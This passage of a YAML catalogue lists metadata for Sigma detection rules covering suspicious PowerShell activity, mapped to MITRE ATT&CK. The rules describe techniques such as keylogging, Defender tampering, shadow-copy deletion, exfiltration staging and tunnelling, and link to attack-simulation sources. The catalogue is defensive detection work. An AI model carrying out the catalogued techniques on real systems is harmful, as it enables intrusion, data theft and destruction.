  techniques:
  - T1564.006
  tags:
  - attack.defense-evasion
  - attack.t1564.006
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.006/T1564.006.md#atomic-test-3---create-and-start-hyper-v-virtual-machine
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: ed965133-513f-41d9-a441-e38076a0798f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_invocation_generic.yml
  name: Suspicious PowerShell Invocations - Generic
  description: Detects suspicious PowerShell invocation command parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Very special / sneaky PowerShell scripts
  notes: ''
- detection_id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_invocation_specific.yml
  name: Suspicious PowerShell Invocations - Specific
  description: Detects suspicious PowerShell invocation command parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - Internal Research
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: d4488827-73af-4f8d-9244-7b7662ef046e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_invoke_webrequest_useragent.yml
  name: Change User Agents with WebRequest
  description: 'Adversaries may communicate using application layer protocols associated
    with web traffic to avoid detection/network filtering by blending in with existing
    traffic.

    Commands to the remote system, and often the results of those commands, will be
    embedded within the protocol traffic between the client and server.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1071.001/T1071.001.md#t1071001---web-protocols
  false_positives:
  - Unknown
  notes: ''
- detection_id: 70ad982f-67c8-40e0-a955-b920c2fa05cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_iofilestream.yml
  name: Suspicious IO.FileStream
  description: Open a handle on the drive volume via the \\.\ DOS device path specifier
    and perform direct access read of the first few bytes of the volume.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1006/T1006.md
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 965e2db9-eddb-4cf6-a986-7a967df651e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_keylogger_activity.yml
  name: Potential Keylogger Activity
  description: Detects PowerShell scripts that contains reference to keystroke capturing
    functions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1056.001
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1056.001
  time_window: ''
  references:
  - https://twitter.com/ScumBots/status/1610626724257046529
  - https://www.virustotal.com/gui/file/d4486b63512755316625230e0c9c81655093be93876e0d80732e7eeaf7d83476/content
  - https://www.virustotal.com/gui/file/720a7ee9f2178c70501d7e3f4bcc28a4f456e200486dbd401b25af6da3b4da62/content
  - https://learn.microsoft.com/en-us/dotnet/api/system.windows.input.keyboard.iskeydown?view=windowsdesktop-7.0
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1f49f2ab-26bc-48b3-96cc-dcffbc93eadf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_keywords.yml
  name: Potential Suspicious PowerShell Keywords
  description: Detects potentially suspicious keywords that could indicate the use
    of a PowerShell exploitation framework
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462
  - https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/CodeExecution/Invoke-ReflectivePEInjection.ps1
  - https://github.com/hlldz/Phant0m/blob/30c2935d8cf4aafda17ee2fab7cd0c4aa9a607c2/old/Invoke-Phant0m.ps1
  - https://gist.github.com/MHaggis/0dbe00ad401daa7137c81c99c268cfb7
  false_positives:
  - Unknown
  notes: ''
- detection_id: fa6a5a45-3ee2-4529-aa14-ee5edc9e29cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_local_group_reco.yml
  name: Suspicious Get Local Groups Information - PowerShell
  description: 'Detects the use of PowerShell modules and cmdlets to gather local
    group information.

    Adversaries may use local system permission groups to determine which groups exist
    and which users belong to a particular group such as the local administrators
    group.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md
  false_positives:
  - Inventory scripts or admin tasks
  notes: ''
- detection_id: 2837e152-93c8-43d2-85ba-c3cd3c2ae614
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_mail_acces.yml
  name: Powershell Local Email Collection
  description: 'Adversaries may target user email on local systems to collect sensitive
    information.

    Files containing email data can be acquired from a users local system, such as
    Outlook storage or cache files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1114.001
  tags:
  - attack.collection
  - attack.t1114.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1114.001/T1114.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 29e1c216-6408-489d-8a06-ee9d151ef819
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_mount_diskimage.yml
  name: Suspicious Mount-DiskImage
  description: Adversaries may abuse container files such as disk image (.iso, .vhd)
    file formats to deliver malicious payloads that may not be tagged with MOTW.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1553.005
  tags:
  - attack.defense-evasion
  - attack.t1553.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image
  - https://learn.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 66a4d409-451b-4151-94f4-a55d559c49b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_mounted_share_deletion.yml
  name: PowerShell Deleted Mounted Share
  description: Detects when when a mounted share is removed. Adversaries may remove
    share connections that are no longer useful in order to clean up traces of their
    operation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.005
  tags:
  - attack.defense-evasion
  - attack.t1070.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.005/T1070.005.md
  false_positives:
  - Administrators or Power users may remove their shares via cmd line
  notes: ''
- detection_id: 1883444f-084b-419b-ac62-e0d0c5b3693f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_networkcredential.yml
  name: Suspicious Connection to Remote Account
  description: 'Adversaries with no prior knowledge of legitimate credentials within
    the system or environment may guess passwords to attempt access to accounts.

    Without knowledge of the password for an account, an adversary may opt to systematically
    guess the password using a repetitive or iterative mechanism

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1110.001
  tags:
  - attack.credential-access
  - attack.t1110.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.001/T1110.001.md#atomic-test-2---brute-force-credentials-of-single-active-directory-domain-user-via-ldap-against-domain-controller-ntlm-or-kerberos
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1c563233-030e-4a07-af8c-ee0490a66d3a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_new_psdrive.yml
  name: Suspicious New-PSDrive to Admin Share
  description: Adversaries may use to interact with a remote network share using Server
    Message Block (SMB). The adversary may then perform actions as the logged-on user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.002/T1021.002.md#atomic-test-2---map-admin-share-powershell
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.2
  false_positives:
  - Unknown
  notes: ''
- detection_id: bd33d2aa-497e-4651-9893-5c5364646595
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_proxy_scripts.yml
  name: Suspicious TCP Tunnel Via PowerShell Script
  description: Detects powershell scripts that creates sockets/listeners which could
    be indicative of tunneling activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://github.com/Arno0x/PowerShellScripts/blob/a6b7d5490fbf0b20f91195838f3a11156724b4f7/proxyTunnel.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: a9723fcc-881c-424c-8709-fd61442ab3c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_recon_export.yml
  name: Recon Information for Export with PowerShell
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1119
  tags:
  - attack.collection
  - attack.t1119
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 48a45d45-8112-416b-8a67-46e03a4b2107
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_remove_adgroupmember.yml
  name: Remove Account From Domain Admin Group
  description: 'Adversaries may interrupt availability of system and network resources
    by inhibiting access to accounts utilized by legitimate users.

    Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove
    access to accounts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1531/T1531.md#atomic-test-3---remove-account-from-domain-admin-group
  false_positives:
  - Unknown
  notes: ''
- detection_id: 22d80745-6f2c-46da-826b-77adaededd74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_service_dacl_modification_set_service.yml
  name: Suspicious Service DACL Modification Via Set-Service Cmdlet - PS
  description: Detects usage of the "Set-Service" powershell cmdlet to configure a
    new SecurityDescriptor that allows a service to be hidden from other utilities
    such as "sc.exe", "Get-Service"...etc. (Works only in powershell 7)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://twitter.com/Alh4zr3d/status/1580925761996828672
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
  false_positives:
  - Rare intended use of hidden services
  - Rare FP could occur due to the non linearity of the ScriptBlockText log
  notes: ''
- detection_id: 96cd126d-f970-49c4-848a-da3a09f55c55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_set_alias.yml
  name: Potential PowerShell Obfuscation Using Alias Cmdlets
  description: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a
    mean to obfuscate PowerShell scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1027
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/1337Rin/Swag-PSO
  false_positives:
  - Unknown
  notes: ''
- detection_id: 95f0643a-ed40-467c-806b-aac9542ec5ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_smb_share_reco.yml
  name: Suspicious Get Information for SMB Share
  description: 'Adversaries may look for folders and drives shared on remote systems
    as a means of identifying sources of information to gather as

    a precursor for Collection and to identify potential systems of interest for Lateral
    Movement.

    Networks often contain shared network drives and folders that enable users to
    access file directories on various systems across a network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.002/T1069.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 195626f3-5f1b-4403-93b7-e6cfd4d6a078
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_ssl_keyword.yml
  name: Suspicious SSL Connection
  description: Adversaries may employ a known encryption algorithm to conceal command
    and control traffic rather than relying on any inherent protections provided by
    a communication protocol.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1573
  tags:
  - attack.command-and-control
  - attack.t1573
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1573/T1573.md#atomic-test-1---openssl-c2
  - https://medium.com/walmartglobaltech/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 0718cd72-f316-4aa2-988f-838ea8533277
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_start_process.yml
  name: Suspicious Start-Process PassThru
  description: Powershell use PassThru option to start in background
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1036.003/T1036.003.md
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Start-Process?view=powershell-5.1&viewFallbackFrom=powershell-7
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 5947497f-1aa4-41dd-9693-c9848d58727d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_unblock_file.yml
  name: Suspicious Unblock-File
  description: Remove the Zone.Identifier alternate data stream which identifies the
    file as downloaded from the internet.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1553.005
  tags:
  - attack.defense-evasion
  - attack.t1553.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.005/T1553.005.md#atomic-test-3---remove-the-zoneidentifier-alternate-data-stream
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/unblock-file?view=powershell-7.2
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: c5ac6a1e-9407-45f5-a0ce-ca9a0806a287
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_wallpaper.yml
  name: Replace Desktop Wallpaper by Powershell
  description: 'An adversary may deface systems internal to an organization in an
    attempt to intimidate or mislead users.

    This may take the form of modifications to internal websites, or directly to user
    systems with the replacement of the desktop wallpaper

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1491.001
  tags:
  - attack.impact
  - attack.t1491.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1491.001/T1491.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: b26647de-4feb-4283-af6b-6117661283c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_win32_pnpentity.yml
  name: Powershell Suspicious Win32_PnPEntity
  description: Adversaries may attempt to gather information about attached peripheral
    devices and components connected to a computer system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1120
  tags:
  - attack.discovery
  - attack.t1120
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1120/T1120.md
  false_positives:
  - Admin script
  notes: ''
- detection_id: c1337eb8-921a-4b59-855b-4ba188ddcc42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_win32_shadowcopy_deletion.yml
  name: Deletion of Volume Shadow Copies via WMI with PowerShell - PS Script
  description: Detects deletion of Windows Volume Shadow Copies with PowerShell code
    and Get-WMIObject. This technique is used by numerous ransomware families such
    as Sodinokibi/REvil
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell
  - https://www.elastic.co/guide/en/security/current/volume-shadow-copy-deletion-via-powershell.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 313fbb0a-a341-4682-848d-6d6f8c4fab7c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_windowstyle.yml
  name: Suspicious PowerShell WindowStyle Option
  description: 'Adversaries may use hidden windows to conceal malicious activity from
    the plain sight of users.

    In some cases, windows that would typically be displayed when an application carries
    out an operation can be hidden

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1564.003
  tags:
  - attack.defense-evasion
  - attack.t1564.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.003/T1564.003.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 35f41cd7-c98e-469f-8a02-ec4ba0cc7a7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_write_eventlog.yml
  name: PowerShell Write-EventLog Usage
  description: Detects usage of the "Write-EventLog" cmdlet with 'RawData' flag. The
    cmdlet can be levreage to write malicious payloads to the EventLog and then retrieve
    them later for later use
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.blackhillsinfosec.com/windows-event-logs-for-red-teams/
  false_positives:
  - Legitimate applications writing events via this cmdlet. Investigate alerts to
    determine if the action is benign
  notes: ''
- detection_id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_susp_zip_compress.yml
  name: Zip A Folder With PowerShell For Staging In Temp - PowerShell Script
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1074.001
  tags:
  - attack.collection
  - attack.t1074.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  false_positives:
  - Unknown
  notes: ''
- detection_id: dddfebae-c46f-439c-af7a-fdb6bde90218
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
  name: SyncAppvPublishingServer Execution to Bypass Powershell Restriction
  description: Detects SyncAppvPublishingServer process execution which usually utilized
    by adversaries to bypass PowerShell execution restrictions.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/
  false_positives:
  - App-V clients
  notes: ''
- detection_id: ae2bdd58-0681-48ac-be7f-58ab4e593458
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_tamper_windows_defender_rem_mp.yml
  name: Tamper Windows Defender Remove-MpPreference - ScriptBlockLogging
  description: Detects attempts to remove Windows Defender configuration using the
    'MpPreference' cmdlet
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: 14c71865-6cd3-44ae-adaa-1db923fae5f2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_tamper_windows_defender_set_mp.yml
  name: Tamper Windows Defender - ScriptBlockLogging
  description: Detects PowerShell scripts attempting to disable scheduled scanning
    and other parts of Windows Defender ATP or set default actions to allow.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps
  - https://bidouillesecurity.com/disable-windows-defender-in-powershell/
  false_positives:
  - Legitimate PowerShell scripts that disable Windows Defender for troubleshooting
    purposes. Must be investigated.
  notes: ''
- detection_id: adf876b3-f1f8-4aa9-a4e4-a64106feec06
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_test_netconnection.yml
  name: Testing Usage of Uncommonly Used Port
  description: 'Adversaries may communicate using a protocol and port paring that
